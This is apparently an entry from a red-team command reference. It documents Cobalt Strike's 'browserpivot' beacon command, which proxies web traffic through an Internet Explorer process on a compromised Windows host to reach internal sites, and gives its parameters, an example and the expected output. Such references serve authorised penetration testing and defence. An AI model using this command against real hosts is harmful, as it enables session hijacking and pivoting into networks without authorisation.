---
id: af743a34-2e27-4b59-b71e-20a8bcf79ee8
name: cobalt-strike-browser-pivot
type: command
executor: bash
data: beacon > browserpivot $_PID $_ARCH
output: null
created_at: '2023-04-06T03:56:16.576325+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - pivoting
  - browser
verified: true
validated: true
---

# cobalt-strike-browser-pivot

## Command

```bash
beacon > browserpivot $_PID $_ARCH
```

## Description

Proxies Internet Explorer browser traffic through a specified IE process on the compromised host, allowing pivoted web requests to internal resources.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_PID | Process ID of the IE instance (use `tasklist` to find) | Yes |
| $_ARCH | Architecture: x86 or x64 | Yes |

## Examples

### Basic Usage

```bash
beacon > browserpivot 1234 x64
```

## Expected Output

Console: "[+] Browser pivot added". Requests via IE or proxied tools reach internal sites; check network captures for forwarded traffic.

## Related

- [[procedures/Establish-VPN-Like-Connection-and-Pivot-Using-Cobalt-Strike]]
- [[tools/Cobalt-Strike]]
